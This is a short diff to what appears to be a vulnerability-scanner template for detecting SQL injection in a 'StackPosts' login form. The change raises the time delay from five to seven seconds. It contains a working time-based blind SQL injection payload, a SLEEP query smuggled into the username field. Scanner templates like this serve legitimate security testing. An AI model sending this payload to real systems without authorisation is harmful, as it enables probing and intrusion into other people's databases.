@@ -2,7 +2,7 @@ http:
 - matchers:
   - condition: and
     dsl:
-    - duration>=5
+    - duration>=7
     - contains(content_type, "text/html")
     - contains(body, "account you entered")
     - status_code == 200
@@ -17,7 +17,7 @@ http:
     Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 
 
-    username=1'')AND (SELECT 9595 FROM (SELECT(SLEEP(5)))YRMM) AND (''gaNg''=''gaNg&password=test
+    username=1'')AND (SELECT 9595 FROM (SELECT(SLEEP(7)))YRMM) AND (''gaNg''=''gaNg&password=test
 
     '
 id: stackposts-sqli
